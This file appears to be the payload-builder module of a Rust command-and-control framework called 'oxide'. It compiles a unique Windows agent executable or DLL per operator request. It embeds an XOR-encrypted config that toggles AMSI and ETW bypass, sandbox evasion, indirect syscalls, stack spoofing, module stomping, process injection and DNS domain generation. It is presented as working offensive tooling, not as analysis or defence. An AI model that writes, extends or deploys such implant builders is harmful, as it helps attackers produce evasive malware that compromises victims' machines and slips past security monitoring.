//! Payload builder — compiles a unique agent binary per operator request.

use crate::state::AppState;
use oxide_common::{
    crypto::xor_encode,
    protocol::SrvMessage,
    types::BuildOptions,
};
use rand::RngCore;
use uuid::Uuid;

pub async fn run(opts: BuildOptions, state: AppState) {
    let build_id = Uuid::new_v4().to_string();
    state.broadcast(SrvMessage::BuildStart { build_id: build_id.clone() }).await;

    match compile(opts, &build_id).await {
        Ok(path) => {
            let size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
            state.broadcast(SrvMessage::BuildDone { build_id, path, size }).await;
        }
        Err(e) => {
            state.broadcast(SrvMessage::BuildFail {
                build_id,
                error: e.to_string(),
            }).await;
        }
    }
}

async fn compile(opts: BuildOptions, build_id: &str) -> anyhow::Result<String> {
    let tmp = std::env::temp_dir().join("oxide_build").join(build_id);
    std::fs::create_dir_all(&tmp)?;

    // 1. Build the per-build config JSON
    let cfg_json = serde_json::json!({
        "build_id":          build_id,
        "sleep_ms":          opts.sleep_ms,
        "jitter_pct":        opts.jitter_pct,
        "sleep_obf":         opts.sleep_obf,
        "injection":         opts.injection,
        "amsi_bypass":       opts.amsi_bypass,
        "etw_bypass":        opts.etw_bypass,
        "sandbox_evasion":   opts.sandbox_evasion,
        "indirect_syscalls": opts.indirect_syscalls,
        "stack_spoof":       opts.stack_spoof,
        "module_stomp":      opts.module_stomp,
        "block_dlls":        opts.block_dlls,
        "encrypted_comms":   opts.encrypted_comms,
        "dns_dga":           opts.dns_dga,
        "server_pubkey":     opts.server_pubkey,
    });

    // 2. Random XOR key + cipher key for macros
    let mut xor_key = [0u8; 32];
    let mut cipher_key = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut xor_key);
    rand::thread_rng().fill_bytes(&mut cipher_key);

    let plain = serde_json::to_vec(&cfg_json)?;
    let encrypted = xor_encode(&plain, &xor_key);

    std::fs::write(tmp.join("agent_key.bin"), &xor_key)?;
    std::fs::write(tmp.join("agent_cfg.bin"), &encrypted)?;

    // 3. Invoke cargo
    let cargo = find_cargo();
    let workspace = workspace_root();
    let cipher_hex = hex::encode(cipher_key);

    let (target_flag, out_ext) = if opts.format == oxide_common::types::PayloadFormat::Dll {
        ("--lib", "dll")
    } else {
        ("--bin oxide-agent", "exe")
    };

    let status = std::process::Command::new(&cargo)
        .args(["build", "--release",
               "--target", "x86_64-pc-windows-gnu",
               "-p", "oxide-agent",
               target_flag])
        .env("OXIDE_OUT_DIR",      tmp.to_str().unwrap())
        .env("OXIDE_BUILD_ID",     build_id)
        .env("OXIDE_CIPHER_KEY",   &cipher_hex)
        .current_dir(&workspace)
        .status()
        .map_err(|e| anyhow::anyhow!("cargo not found ({cargo}): {e}"))?;

    if !status.success() {
        anyhow::bail!("Agent compilation failed");
    }

    let compiled = workspace
        .join(format!("target/x86_64-pc-windows-gnu/release/oxide-agent.{out_ext}"));

    std::fs::copy(&compiled, &opts.output_path)
        .map_err(|e| anyhow::anyhow!("copy {} → {}: {e}", compiled.display(), opts.output_path))?;

    Ok(opts.output_path)
}

fn find_cargo() -> String {
    use std::path::Path;
    if let Ok(c) = std::env::var("CARGO") {
        if Path::new(&c).exists() { return c; }
    }
    for home in [
        std::env::var("HOME").unwrap_or_default(),
        "/root".into(),
        "/home/kali".into(),
    ] {
        let p = format!("{home}/.cargo/bin/cargo");
        if Path::new(&p).exists() { return p; }
    }
    for p in ["/usr/local/bin/cargo", "/usr/bin/cargo"] {
        if Path::new(p).exists() { return p.to_string(); }
    }
    if let Ok(o) = std::process::Command::new("which").arg("cargo").output() {
        let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !s.is_empty() { return s; }
    }
    "cargo".into()
}

fn workspace_root() -> std::path::PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|e| e.parent().and_then(|p| p.parent()).and_then(|p| p.parent()).map(|p| p.to_path_buf()))
        .unwrap_or_else(|| std::env::current_dir().unwrap_or_default())
}
